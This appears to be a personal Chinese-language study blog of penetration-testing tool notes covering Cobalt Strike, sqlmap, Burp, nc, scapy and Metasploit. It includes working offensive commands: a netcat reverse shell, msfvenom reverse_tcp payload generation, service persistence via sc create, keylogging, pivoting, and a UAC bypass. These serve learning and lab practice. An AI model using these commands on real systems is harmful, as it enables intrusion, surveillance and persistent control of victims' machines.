---
title: tools help
date: 2022-01-22 11:32:54
tags:
      - tools
      - 安全
      - nmap
categories:
      - 安全
description: 收集日常使用的渗透工具以及框架，在这里进行一波笔记的整理
keywords:
      - nmap
      - sqlmap
      - burpsuite
      - nc
      - scapy
top_img: /img/tools.png
cover: /img/tools.png
---

# tools 

## CS(Cobalt-Strike)

下载CS包后使用teamserver来运行

> teamserver IP（自己的） 密码
>
> 来启动一个服务
>
> 
>
> 然后使用cobaltstrike来监听服务
>
> 用户名随便，端口默认即可（50050）密码是刚刚自己设置的密码用户名也是自己刚刚设置的用户名

Cobalt Stricke->listener->add添加监听器

![image-20220218105927379](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-1.png)

注意这个Hosts是需要添加攻击者的ip

![image-20220218110141048](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-2.png)

创建完成后显示如上方的可以看出监听了80端口

![image-20220218110809529](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-3.png)

单机launch以后出现如下框

![image-20220218110849052](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-4.png)

把脚本内容复制到一个文件中(Windows能运行的格式),之后单机ok,在Event Log选项框中就会显示监听记录,然后用Windows来执行这个文件就可以上线了

![image-20220218111623239](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-5.png)

然后就可以看出来上线了

右击该电脑后选择interact后如下框内可以输入命令（默认60秒回显一次，如果想要设置时间右击被控制的电脑选择session->sleep）,**使用help可以查看所有的命令**

![image-20220218111744041](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-6.png)



- 菜单栏

  - CobaltStrack

    - VPN Interfaces：设置VPN
    - Listeners：创建监听端口
    - Visuallzation：查看结果
    - Script Manager：加载一个脚本

  - View

    - application：显示被控制电脑的信息

    - credentials：可以获取密码

    - Downloads：从被控的电脑下载东西

    - EventLog：上线记录

    - Keystrokes：键盘记录

    - ProxyPivots：代理模块

      - ![image-20220218121457035](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-7.png)

    - screenshots：截图

    - scriptconsole：执行脚本

      - sleep语言

        - e用于定义变量例如:e $a="haha";

        - x变量输出例如:x $a;

          - x targets():输出目标ip地址啥的
          - x listeners():输出监听器
          - x beacons():所有感染的主机信息
          - x downloads():显示下载信息
          - x sites():显示资产信息
          - x screenshots()显示屏幕信息
          - x credentials():显示凭据信息

        - $代表变量

        - @代表数组例如:@arr=@('a','b');

        - load 用来加载本地的sleep文件并执行

        - println输出

        - foreach循环例如:foreach $var (@arr){println($var);}

        - %定义字典例如:%dic['aaa']="asdas";%dic[$aaa]="asdas";

        - **.** 字符串的衔接符号例如"aaa"."bbbb"

        - reload重新加载(这个时候是只能从已经加载的文件中重新加载使用ls来查看已经加载的文件)

        - command w {e $var=1;println("you are click w".$var);}调用的时候直接w即可,**并且用help可以看到这条命令**

        - sub定义函数sub fun1{println("111");}fun1();

          - ![image-20220218141618775](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-14.png)

        - bind绑定键盘快捷键例如bind Ctrl+o{show_message("aaa");elog("bbb");}

        - popup自定义菜单例如:

          - ![image-20220218143029938](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-15.png)

          - ```sleep
            popup item1{
              item("&kkk",{url_open("http://www.baidu.com")});
              separator();
              item("&vvv",{url_open("http://www.cctv.com")});
            }
            menubar("my popup","item1");
            
            //右击添加菜单
            popup item1{
            	menu "attack"{
            	 item("&kkk",{url_open("http://www.baidu.com")});
              	separator();
              	item("&vvv",{url_open("http://www.cctv.com")});
              }
            }
            ```

    - target

    - weblog：web日志

  - attacks：

    - package：攻击方式
      - HTML application基于HTML攻击应用的载荷
      - MS office macro宏病毒
      - Payload Generator：生成payload
      - Windows Executable：生成exe后门对方运行即可上线
      - Windows Executable（s）：提供代理设置，内网攻击可能用到
    - Web Drive-by：
      - manage：肉鸡管理
      - clone site：克隆网站
      - Host file：指定文件夹到web里
      - Script web delivery：web攻击模块
      - signed applet attack：Java钓鱼
      - smark applet attack
      - system profile：客户端检测工具
    - spear Phish：钓鱼邮件

  - Reporting：生成报告栏

- 右击肉鸡

  - intetact:输入指令
    - 如果目标在域上面可以使用net computer查看计算机
    - net dclist查找域控
    - net domain_trusts域的信任情况
    - net logons
    - net share共享
    - 
  - access:
    - make Token:创建一个虚拟用户
  - exploit:
    - Browser Pivot:监听浏览器以获取cookie
    - Desktop:监控桌面
    - File Browser:
      - ![image-20220218123725120](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-11.png)
    - port scan:扫描端口
    - process list:查看所有进程
    - screenshot:截屏幕
  - pivoting
    - socks server:使肉鸡创建代理
    - listeners:使肉鸡开启监听
  - session
    - sleep:命令反应时间
    - exit:关闭肉鸡
    - remove:移除肉鸡



### 用肉鸡来创建代理并连接到metasploit

![image-20220218121633689](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-8.png)





### 跳板攻击

![image-20220218121934998](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-9.png)

单击save就可以看见Listeners多了一个监听端口

![image-20220218122224254](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-10.png)

然后让其他内网直接连接这个ip:port即可 



### 监听浏览器输入

将进程添加到键盘记录

![image-20220218133049983](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-12.png)





打开全局的键盘监听

![image-20220218133152326](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-13.png)

然后就可以监听键盘记录了



### 提供下载木马地址并进行下载

首先生成一个木马

![image-20220218163434235](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-16.png)

设置监听的文件第二个图的file里选择木马，url里面的文件名称要和你的木马名称一致

![image-20220218163509654](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-17.png)

![image-20220218163554181](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-18.png)



launch后他给出下载文件的地址,复制即可下载运行即可上线

![image-20220218163757545](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-19.png)



### 维持化

首先生成一个木马

选择一个目录

upload [木马所在位置]这也就可以上传了

shell sc create "服务名称" -binpath="脚本全称(包含路径)"

shell sc description "服务名称" "服务的描述"

shell sc config "服务名称" start=auto

shell net start "服务名称"



### 多层次的连接

方法一:

首先给添加一个tcp监听

![image-20220218171804604](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-20.png)

然后创建一个payload使用刚刚建立的tcp监听

![image-20220218171859961](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-21.png)

然后上传到目标的内网服务器中并运行

然后使用肉鸡的命令行输入connect [目标的ip地址]

![image-20220218172009462](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-22.png)

方法二:

![image-20220218172823811](D:\Code\pojo\Blog\BlogHexo\public\img\cobaltStrike-23.png)

首先使用肉鸡建立一个监听

生成payload 使用这个监听

然后让目标主机运行即可



特征过滤：https://kosakd.top/2021/05/05/CobaltStrike%E6%95%99%E7%A8%8B/



## AWVS

AWVS是一款知名的自动化网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流行安全漏洞。它可以扫描任何可通过Web浏览器访问的和遵循HTTP/HTTPS规则的Web站点和Web应用程序。适用于任何中小型和大型企业的内联网、外延网和面向客户、雇员、厂商和其它人员的Web网站。WVS可以通过检查SQL注入攻击漏洞、XSS跨站脚本攻击漏洞等漏洞来审核Web应用程序的安全性。



>pull 拉取下载镜像
>docker pull secfa/docker-awvs
>
>或者
>
>docker pull secfa/awvs
>
>
>
>将Docker的3443端口映射到物理机的 13443端口
>docker run -it -d -p 13443:3443 secfa/docker-awvs
>
>容器的相关信息
>awvs13 username: admin@admin.com
>awvs13 password: Admin123
>AWVS版本：13.0.200217097
>
>浏览器访问：https://127.0.0.1:13443/ 即可
>
>注意了是HTTPS而不是HTTP

https://www.bilibili.com/video/BV1fz4y1U7tt?from=search&seid=3146379149281441812&spm_id_from=333.337.0.0

这上面最后一部分讲到了代码如何使用

## nmap

nmap：一款端口扫描工具

使用方法以及参数如下

==在这里$ 代表ip或者url==

> nmap $
>
> - -v:显示详细信息
> - -p:指定端口
>   - -p 80,8080
> - -O:扫描目标是什么操作系统,使用的什么协议
> - -iL 文件:扫描指定文件的ip
> - -V:版本检测 用于扫描目标主机服务版本号. 探测打开的端口以确定服务/版本信息
> - -sA:综合模式扫描
> - -sS:安全模式扫描
> - -sL:list扫描
> - -sT:使用tcp扫描模式
> - -sF:快速扫描
> - -sR:RPC扫描
> - -sn:测试存活主机
> - -U:测试那些udp开放
> - -X:表示以xml的格式输出结果到以文件
> - -P:ping探测
> - -Pn:跳过主机存活扫描过程
> - -P0:ip检测协议是否开启
> - -T:设定模板(越高越快)
>
> 常用
>
> nmap -sS $
>
> nmap -sA -T 4 $



## SQLmap

nginx /etc/nginx/nginx.conf



一款sql注入测试工具



sqlmap -r 文件名

sqlmap -u url或者域名

哪个位置需要进行注入就在哪个位置加==\*==,如下

> sqlmap -u http://localhost/?id=111\*&kkk=aaa

这样就可以对id进行注入了(文件中也一样)

下面是常用命令

>- --dbs:获取所有的数库
>- --current-db:获取当前的数据库
>- --threads 10:开启10个线程
>- --data id=111&password=222:使用post提交,并且表单为id和password
>- --tables -D "库":获取指定数据库的所有表
>- --columns -T "表名称" -D "库名":获取指定库名的表中所有字段
>- --dump -T "表名称" -D "库名" -C "字段":获取指定按照指定的库名表名字段来获取数据库的数据
>- --cookie:使用cookie
>- --file-read"读取的文件夹位置":读取某个文件
>- --file-write "绝对路径":写入文件到某个绝对路径中
>- --batch:自动yes
>- --risk 3:执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全
>- --referer "":使用referer欺骗
>- --user-agent "":自定义user-agent
>- --proxy "目标地址":使用代理注入
>-  -v  详细的等级(0-6)
>            0：只显示Python的回溯，错误和关键消息。
>            1：显示信息和警告消息。
>            2：显示调试消息。
>            3：有效载荷注入。
>            4：显示HTTP请求。
>            5：显示HTTP响应头。
>            6：显示HTTP响应页面的内容
>- --os-shell(需要绝对路径和语言):获取shell



## Burp



是一个数据包捕获软件

首先我们可以设置代理

![image-20220122160622437](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-1.png)

然后去浏览器设置代理以火狐为例子

去设置里面的高级---网络---代理

![image-20220122161034011](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-2.png)

然后安装协议首先访问http://burp

然后下载证书,然后进入设置,高级---证书---证书机构---导入   这样导入证书

![image-20220122161254985](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-3.png)



#### 使用本地的DNS

![image-20220122161507557](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-4.png)



选择这个打开dns服务器,然后就可以使用并看到结果了

![image-20220122161604192](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-5.png)



当我们抓取到数据后就可以进行参数设置,当我们进行post提交的时候有时需要进行编码的调整如:==%00需要被编码否则传输过程中可能会丢失,而且%00进行base64时会被丢失==



![image-20220122162024999](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-6.png)

Send to Intruder和Send to Repeater的时候不能选择东西否则只会进行选择部分的测试



#### 首先介绍一下Send to Intruder    暴力破解

pikaqiu靶场

暴力破解第一题

首先单击请求进行请求

![image-20220119151356569](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-7.png)

然后抓到包后ctrl+i

![image-20220119151545986](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-8.png)



然后进入如下模块并对破解点进行添加

![image-20220119151700990](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-9.png)



![image-20220119154920801](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-10.png)

设置一个type然后进入payloads

![image-20220119155535580](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-11.png)

设置线程数量

![image-20220119155617982](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-12.png)

设置正则获取页面数据

![image-20220119155652450](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-13.png)



单机add设置正则

![image-20220119155849551](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-14.png)



![image-20220119160023712](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-15.png)



设置每次攻击前重新获取token就要进行重定向

![image-20220119160133327](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-16.png)



## nc

一个进行远程命令控制的



黑客电脑的nc运行如下命令

nc -lvp [端口号]



靶机运行如下命令

nc -nv [ip] [端口] -e cmd.exe





>- -l:将nc监听模式运行
>- -k:接受一个请求不会结束而是继续监听



## neo-regeorg

生成一个有密码的脚本

python neoreg.py generate -k 密码

然后生成几个脚本，将脚本放到目标网站并且能访问到

python neoreg.py -k 密码 -u 网站的脚本位置

然后他会返回一个socket5的连接方法,将他设置为代理即可访问

## WireShark

![image-20220214133549383](D:\Code\pojo\Blog\BlogHexo\public\img\wireshark.png)

 （1）Frame:  物理层的数据帧概况

 （2）Ethernet II: 数据链路层以太网帧头部信息

 （3）Internet Protocol Version 4: 互联网层IP包头部信息

 （4）Transmission Control Protocol: 传输层T的数据段头部信息，此处是TCP

 （5）Hypertext Transfer Protocol: 应用层的信息，此处是HTTP协议



过滤规则

ip==127.0.0.1

> ip.dst==127.0.0.1目的ip查询
>
> ip.src==127.0.0.1源ip查询



协议过滤

直接写协议即可如tcp,icmp,udp,http等

>对协议内的内容进行过滤如:
>
>http.request.method=="POST"
>
>tcp.port=443



连接符

and/or/not



tcp三次握手

第一次发送数据包SYN=1,ACK=0

第二次接收数据包SYN=1,ACK=1

第三次发送数据包SYN=0,ACK=1



## Nessus

http://www.luckyzmj.cn/posts/477c90d0.html





## scapy---这东西真好玩

下面是官方源码地址:

> https://github.com/secdev/scapy/blob/master/scapy/sessions.py



### 准备环境

![image-20220129180955360](D:\Code\pojo\Blog\BlogHexo\public\img\scapy-4.png)



官方目前给出python对应的scapy版本  目前时间为:`2022-1-29`



首先下载安装

`pip install scapy`，然后在命令行中输入scapy即可运行交互的scapy

> 如果显示没有找到包则证明环境变量不对,我以win10为例子来说明一下

![image-20220129175922805](D:\Code\pojo\Blog\BlogHexo\public\img\scapy-1.png)

必须包含你python的Scripts在环境变量中

kali也是直接安装(kali是ubuntu那一支的)`pip install scapy`,然后还需要:

> apt-get install tcpdump



然后我们还有几个可能用到的依赖

> pip install matplotlib	 //作图
>
> pip install pyx				//二维
>
> 但是如果要使用pyx需要安装 [texlive (Unix)](http://www.tug.org/texlive/) 或 [MikTex (Windows)](https://miktex.org/) 
>
> kali安装texlive方法`apt-get install texlive`
>
> 
>
> 
>
> pip install vpython		//三维
>
> pip install cryptography //WEP解密





### 文档地址

> 中文文档
>
> https://www.osgeo.cn/scapy/usage.html
>
> 英文文档
>
> https://scapy.readthedocs.io/en/latest/usage.html

建议这俩组合起来看,否则你就会遇见下面这种翻译,这tm不是机翻我真不信

![img](D:\Code\pojo\Blog\BlogHexo\public\img\scapy-2.png)



![111](D:\Code\pojo\Blog\BlogHexo\public\img\scapy-3.png)



(不要问我为啥不直接看英文的)



### 开始使用!!

运行交互环境

> scapy   



#### 自定义主题

> conf.color_theme = BrightTheme()
>
> 下面是常用主题
>
> ```
> DefaultTheme, BrightTheme, RastaTheme, ColorOnBlackTheme, BlackAndWhite, HTMLTheme, LatexTheme
> ```



#### 构建IP包

>a=IP()
>
>设置属性
>
>a.dst="192.168.1.1"
>
>删除属性
>
>del(a.dst)



> 合成包运算符(就算再python中也是这么用,我是没想到)
>
> `IP()`
> <IP |>
> `P()/TCP()`
> <IP frag=0 proto=TCP |<TCP |>>
>
> `Ether()/IP()/TCP()`
>
> <Ether  type=IPv4 |<IP  frag=0 proto=tcp |<TCP  |>>>
>
> `IP()/TCP()/"GET / HTTP 1.1 \n\n"`
>
> <IP  frag=0 proto=tcp |<TCP  |<Raw  load='GET / HTTP 1.1 \n\n' |>>>



#### 构造包和分解包

> `raw(IP())`
>
> b'E\x00\x00\x14\x00\x01\x00\x00@\x00|\xe7\x7f\x00\x00\x01\x7f\x00\x00\x01'
>
> `IP(_)`
>
> <IP  version=4 ihl=5 tos=0x0 len=20 id=1 flags= frag=0 ttl=64 proto=hopopt chksum=0x7ce7 src=127.0.0.1 dst=127.0.0.1 |>
>
> ![image-20220129185254036](D:\Code\pojo\Blog\BlogHexo\public\img\scapy-5.png)
>
> ![image-20220129185355181](D:\Code\pojo\Blog\BlogHexo\public\img\scapy-6.png)

上面的e是使用函数对其进行补充后的包如果嫌他太臃肿可以使用`hide_defaults()来进行隐藏`

![image-20220129185707137](D:\Code\pojo\Blog\BlogHexo\public\img\scapy-7.png)



#### 从PCAP中读取

```python
a=rdpcap("/spare/captures/isakmp.cap")
```

#### 将数据存为PDF或者PS

| Command                 | Effect                                   |
| ----------------------- | ---------------------------------------- |
| raw(pkt)                | 源数据                                   |
| hexdump(pkt)            | ==16进制源数据==                         |
| ls(pkt)                 | ==包列表,详细列出所有的包,的全名和属性== |
| pkt.summary()           | ==一条概括==                             |
| pkt.show()              | ==树状展示数据==                         |
| pkt.show2()             | 没看出来和上面的有啥区别                 |
| pkt.sprintf()           | 没试出来有啥用                           |
| pkt.decode_payload_as() | changes the way the payload is decoded   |
| pkt.psdump()            | 用解释的解剖绘制PostScript图表           |
| pkt.pdfdump()           | 用解释的解剖绘制PDF                      |
| pkt.command()           | 返回可生成数据包的scapy命令              |



#### https://scapy.readthedocs.io/en/latest/usage.html#generating-sets-of-packets

这一部分没看懂,好像是你生成了一个数据包的集合然后你要怎么从一个来获取全部??



#### 发送数据包

主要有两个函数

send()用于发送第三层的数据包,无响应接收

sendp()用于发送第二层的数据包,无响应接收



sr1()用于发送三层的数据包,有响应接收

srp()用于二层的数据包,有响应接收

![image-20220130110015724](D:\Code\pojo\Blog\BlogHexo\public\img\scapy-8.png)



> 可以设置两个数据包之间的等待间隔使用inter参数(秒为单位)
>
> 如果某些包超时了,或者丢失了可以重传,使用retry参数来设置,如果retry=3则尝试重新发送三次未响应的数据包,如果retry=-3则重新发送未响应的数据包,并直到连续三次为止
>
> timeout用来指定最后一个数据包的等待时间
>
> 下面是例子:
>
> ```
> sr(IP(dst="172.20.29.5/30")/TCP(dport=[21,22,23]),inter=0.5,retry=-2,timeout=1)
> ```



#### 默认值修改函数

fuzz()

修改后的数值是随机的,操作如下

> send(IP(dst="target")/fuzz(UDP()/NTP(version=4)),loop=1)



#### 注入字节

在数据包中,所有的字段都有特定的类型,如果你想要注入不同的类型可以使用RawVal

> pkt = IP(len=RawVal(b"NotAnInteger"), src="127.0.0.1")



#### SYN扫描

![image-20220130111816301](D:\Code\pojo\Blog\BlogHexo\public\img\scapy-9.png)

向百度发出请求,并且接收响应后退出,可以看出flags=SA表示该端口为开放端口

检测多个端口

> sr(IP(dst="192.168.1.1")/TCP(sport=666,dport=(440,443),flags="S"))
>
> 从440到443端口

> sr(IP(dst="192.168.1.1")/TCP(sport=RandShort(),dport=[440,441,442,443],flags="S"))
>
> 这样可以写成一个数组然后进行探测

如果没有设置变量可以是使用\_来获取探测结果

```
ans, unans = _
>>> ans.summary()
```

> ans.summary( lambda s,r: r.sprintf("%TCP.sport% \t %TCP.flags%") )

还可以和上面这种进行格式化输出



==make_table部分没看懂==



过滤flags只为SA



nsummary和summary的区别

![image-20220203190633834](D:\Code\pojo\Blog\BlogHexo\public\img\scapy-12.png)

> ans.nsummary(lfilter = lambda s,r: r.sprintf("%TCP.flags%") == "SA")

对端口进行专门分析,并得出哪些是开放的

> ans.summary(lfilter = lambda s,r: r.sprintf("%TCP.flags%") == "SA",prn=lambda s,r: r.sprintf("%TCP.sport% is open"))

![image-20220130113405578](D:\Code\pojo\Blog\BlogHexo\public\img\scapy-10.png)

懒得写了,也没法做测试,毕竟上个一测试我还没做完了

#### lsc()可查看大部分的函数

>PID_count          : Identify IP id values classes in a list of packets
>arpcachepoison      : Poison target's cache with (your MAC,victim's IP) couple
>arping              : Send ARP who-has requests to determine which hosts are up
>arpleak             : Exploit ARP leak flaws, like NetBSD-SA2017-002.
>bind_layers         : Bind 2 layers on some specific fields' values.
>bridge_and_sniff    : Forward traffic between interfaces if1 and if2, sniff and return
>chexdump            : Build a per byte hexadecimal representation
>computeNIGroupAddr  : Compute the NI group Address. Can take a FQDN as input parameter
>corrupt_bits        : 
>corrupt_bytes       : 
>defrag              : defrag(plist) -> ([not fragmented], [defragmented],
>defragment          : defragment(plist) -> plist defragmented as much as possible 
>dhcp_request        : Send a DHCP discover request and return the answer
>dyndns_add          : Send a DNS add message to a nameserver for "name" to have a new "rdata"
>dyndns_del          : Send a DNS delete message to a nameserver for "name"
>etherleak           : Exploit Etherleak flaw
>explore             : Function used to discover the Scapy layers and protocols.
>fletcher16_checkbytes: Calculates the Fletcher-16 checkbytes returned as 2 byte binary-string.
>fletcher16_checksum : Calculates Fletcher-16 checksum of the given buffer.
>fragleak            : --
>fragleak2           : --
>fragment            : Fragment a big IP datagram
>fuzz                : 
>getmacbyip          : Return MAC address corresponding to a given IP address
>getmacbyip6         : Returns the MAC address corresponding to an IPv6 address
>hexdiff             : Show differences between 2 binary strings
>hexdump             : Build a tcpdump like hexadecimal view
>hexedit             : Run hexedit on a list of packets, then return the edited packets.
>hexstr              : Build a fancy tcpdump like hex from bytes.
>import_hexcap       : Imports a tcpdump like hexadecimal view
>is_promisc          : Try to guess if target is in Promisc mode. The target is provided by its ip.
>linehexdump         : Build an equivalent view of hexdump() on a single line
>ls                  : List  available layers, or infos on a given layer class or name.
>neighsol            : Sends and receive an ICMPv6 Neighbor Solicitation message
>overlap_frag        : Build overlapping fragments to bypass NIPS
>promiscping         : Send ARP who-has requests to determine which hosts are in promiscuous mode
>rdpcap              : Read a pcap or pcapng file and return a packet list
>report_ports        : portscan a target and output a LaTeX table
>restart             : Restarts scapy
>rfc                 : 
>send                : 
>sendp               : 
>sendpfast           : Send packets at layer 2 using tcpreplay for performance
>sniff               : 
>split_layers        : Split 2 layers previously bound.
>sr                  : 
>sr1                 : 
>sr1flood            : Flood and receive packets at layer 3 and return only the first answer
>srbt                : send and receive using a bluetooth socket
>srbt1               : send and receive 1 packet using a bluetooth socket
>srflood             : Flood and receive packets at layer 3
>srloop              : Send a packet at layer 3 in loop and print the answer each time
>srp                 : 
>srp1                : 
>srp1flood           : Flood and receive packets at layer 2 and return only the first answer
>srpflood            : Flood and receive packets at layer 2
>srploop             : Send a packet at layer 2 in loop and print the answer each time
>tcpdump             : Run tcpdump or tshark on a list of packets.
>tdecode             : 
>traceroute          : Instant TCP traceroute
>traceroute6         : Instant TCP traceroute using IPv6
>traceroute_map      : Util function to call traceroute on multiple targets, then
>tshark              : Sniff packets and print them calling pkt.summary().
>wireshark           : 
>wrpcap              : Write a list of packets to a pcap file



#### 套接字

套接字简单的理解是网络中两个应用之间的通信格式是ip：端口

默认情况使用本地套接字，如果要使用手动的数据包捕获库函数就要安装下面的东西：

- 在UNIX/OSX上：确保安装了libpcap。
- 在Windows上：安装npcap/winpcap。（默认）

然后

conf.use_pcap=true

这时会自动使用

conf.L2socket和conf.L3socket

如果想要使用自定义的可以如下设置

>```
>conf.L3socket=L3pcapSocket  # Receive/send L3 packets through libpcap
>conf.L2listen=L2ListenTcpdump  # Receive L2 packets through TCPDump
>```



#### 嗅探

监听指定的包如下：

![image-20220203190331356](D:\Code\pojo\Blog\BlogHexo\public\img\scapy-11.png)

然后可以使用

>a=_
>
>a[1]
>
>a.nsummary()
>
>来查看详细数据



sniff函数解析如下:

- filter:使用过滤规则

  - > sniff(filter="icmp and host 66.35.250.151")
    >
    >只保留icmp包和地址是66.35.250.151的数据包

- session:监听包的类型

  - IPSession:获取所有的IP包
  - TCPSession:获取所有的TCP包
  - TLSSession:匹配TLS会话//这个好像不存在了

- iface:指定监听网卡号

  - >sniff(iface="eth1")
    >
    >只保留eth1网卡的数据包

- prn:结果显示方式

  - >prn=lambda x: x.show()
    >
    >使用lambda来对数据用show来显示
    >
    >sniff(iface=["eth1","eth2"], prn=lambda x: x.sniffed_on+": "+x.summary())
    >
    >x.sniffed_on代表根据,如下的eth0
    >
    >![image-20220203191845601](D:\Code\pojo\Blog\BlogHexo\public\img\scapy-13.png)

操作系统识别:可以使用ping的TTL来识别,不过可能会被伪装,<64的操作系统是Linux或者unix反之则是Windows



异步嗅探:



AsyncSniffer使用这个来代替sniff就可以了参数和sniff一样



#### ARP欺骗

ARP：地址解析协议用来通知网络我是谁

原理是让受害机认为我是网关，让网关认为我是受害机



关于scapy的ARP包

![image-20220307165322717](D:\Code\pojo\Blog\BlogHexo\public\img\scapy-14.png)

>op 为1代表请求,为2代表响应
>
>hwsrc 发送方的MAC地址
>
>psrc    发送方的ip
>
>hwdst 目标的MAC
>
>pdst    目标的IP





## rdesktop

远程桌面连接软件

https://blog.csdn.net/cunjiu9486/article/details/109073104



## metasploit

### **常用的功能模块**

模块在kali的位置

> /usr/share/metasploit-framework/scripts/meterpreter

| 模块名称  | 模块作用                                                     |
| --------- | ------------------------------------------------------------ |
| Auxiliary | 负责执行信息收集，扫描，嗅探，指纹识别，口令猜测和Dos攻击等功能的辅助模块 |
| Exploits  | 利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法（主动，被动） |
| Payloads  | 成功exploit之后，真正在目标系统执行的代码和命令。            |
| Post      | 后期渗透模块，在取得目标系统远程控制权后吗，进行一系列的后渗透攻击动作，如获取敏感信息，跳板攻击等操作。 |
| Encoders  | 对payload进行加密，躲避antiviru检查的模块。                  |
| Nops      | 提高payload稳定性及维持大小，在渗透攻击构造恶意数据缓冲区时，常常要在真正要执行shellcode之前添加一段空指令区，这样当触发渗透攻击后跳转执行shellcode时，有一个较大的安全着陆区，从而避免受到内存地址随机化，返回地址计算偏差等原因造成的shellcode执行失败，提高渗透攻击的可靠性。 |



升级msf

>apt update

MSFDB

>msfdb init       # start and initialize the database  postgresql
>msfdb reinit    # delete and reinitialize the database
>msfdb delete  # delete database and stop using it
>msfdb start     # start the database
>msfdb stop     # stop the database
>msfdb status   # check service status
>msfdb run       # start the database and run msfconsole



| help或者？   | 显示msfconsole可以使用的命令。                               |
| ------------ | ------------------------------------------------------------ |
| connect      | 可以理解为MSF中的nc命令，可以使用connect -h查看详细用法。    |
| show         | 可以查看msf提供的资源。在根目录下执行的话，由于有些资源模块比较多，需要执行show命令较长的时间。show exploits：查看可以使用的exploit。除了exploits，还支持all，encoders，nops，payloads，auxiliary，post，options。有些选项需要用use使用一个模块后才能使用，show targets。 |
| search       | 搜索模块简单搜索：search ms17_010。多条件搜素缩小范围：search name:mysql type:exploit platform:linux |
| info         | 查看模块信息info <module name>如果用use使用了一个模块，直接输入info查看。 |
| use          | search找到模块后，用use使用模块use exploit/windows/smb/mso8_067_netapi用use使用一个模块后，可以使用show options查看我们需要配置的选项，使用show targets选择目标主机系统，使用show payload选择payload。 |
| set/setg     | 设置参数，比如要渗透的主机ip，payload等 ，我们可以使用show missing查看没有设置的参数。setg是设置全局变量，避免每个模块都要输入相同参数 |
| unset/unsetg | 取消设置参数和取消设置的全局变量                             |
| save         | 设置的此参数在下一次启动的时候不会生效，可以用save保存我们使用过程的设置。 |
| check        | 检查模块是否真的存在这个漏洞，大部分模块没有check功能        |

| back        | 返回msfcomsole根目录                                         |
| ----------- | ------------------------------------------------------------ |
| run/exploit | 开始使用模块exploit -j：以后台进行运行                       |
| sessions    | 查看当前以建立的sessions，说明已经拿到了shellsessions -i id 可以进入一个session交互 |
| load/unload | 调用外部的扫描命令，比如openvas                              |
| loadpath    | 加载自己的模块                                               |
| route       | 添加一条路由，比如发往某个子网的流量都通过攻陷的机器发送。   |



获取到的肉鸡下面运行的命令如下:

- run

  - get_local_subnets:搜集内网信息
  - autoroute -s 内网ip/子网掩码长度:将肉鸡添加路由内网的功能
    - -p 查看路由表情况
  - post/windows/gather/arp_scanner RHOSTS=内网ip/子网掩码长度    ==是RHOSTS不是RHOST==:扫描内网

- portfwd flush:应该是清除设置

  - portfwd add -L 黑客ip -l 黑客的端口 -p 内网的某些来向端口 -r 内网的某台计算机的ip

    - >portfwd add -L 192.168.43.185 -l 2020 -p 80 -r 172.10.10.1
      >
      >这句话的意思是将172.10.10.1:80的数据转发到192.168.43.185:2020
      >
      >访问192.168.43.185:2020就直接跳转到172.10.10.1:80上面了

    - **这条命令可以当作给肉鸡添加路由表**

    

socket代理:承接上面的当我们设置了内网服务器为跳板的时候（metasploit已经进入内网了，需要将他设置为跳板让别的软件也能访问内网）

- use auxiliary/server/socks_proxy：使用代理模块

- set srvhost 127.0.0.1：设置本机代理

- set srvport 40004：设置本机端口

- set version 4a：设置代理版本

- run：启用代理

- jobs：查看启动是否成功

- vim /etc/proxychains4.conf修改代理文件

- [ProxyList]下面添加socks4 127.0.0.1 40004(IP 和端口号改成自己的),并且proxy_dns注释掉

- 接下来就可以使用了

- proxychains 命令

  - >例如
    >
    >proxychains nmap "http://www.baidu.com"

netsh进行msf的代理

假设当前网络为这样

![image-20220219163859692](D:\Code\pojo\Blog\BlogHexo\public\img\内网-1.png)

黑客(kali)                                                           Windows    1                                             Windows 2



生成一个木马脚本

> msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.214.140 lport=4455 -f exe > aaa.exe
>
> msfconsole
>
> use exploit/multi/handler
>
> set payload windows/meterpreter/reverse_tcp
>
> set lhost 192.168.1.186
>
> set lport 4455
>
> exploit
>
> 获取之后可以使用background返回上一层



然后在Windows1上面设置

>netsh interface portproxy add v4tov4 listenport=4455 connectaddress=192.168.1.186 connectport=4455

设置完成后Windows2上面如果运行了攻击脚本则会获取shell



### uac提权

控制了肉鸡以后

> use exploit/windows/local/bypassuac
>
> set session 1(设置成被控制的那个肉鸡)
>
> run
>
